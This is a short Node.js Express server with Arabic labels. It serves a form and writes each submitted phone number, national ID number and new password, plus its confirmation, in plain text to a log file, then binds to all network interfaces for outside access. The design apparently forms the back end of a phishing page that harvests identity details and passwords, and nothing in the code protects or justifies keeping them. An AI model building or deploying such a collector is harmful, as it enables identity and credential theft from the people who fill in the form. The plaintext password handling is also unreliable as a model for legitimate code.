const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', (req, res) => {
  res.render('index');
});

app.post('/submit', (req, res) => {
  const { phone, national_id, new_pass, confirm_pass } = req.body;
  const entry = `
----------------------
📅 ${new Date().toLocaleString()}
📱 الهاتف: ${phone}
🪪 الرقم الوطني: ${national_id}
🔑 كلمة المرور: ${new_pass}
🔒 تأكيدها: ${confirm_pass}
`;

  fs.appendFileSync('log.txt', entry);
  res.render('success');
});

// ✅ التعديل هنا: جعل الخادم يستمع على 0.0.0.0 بدلاً من localhost
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Running on http://<your-ip>:${PORT}`);
});
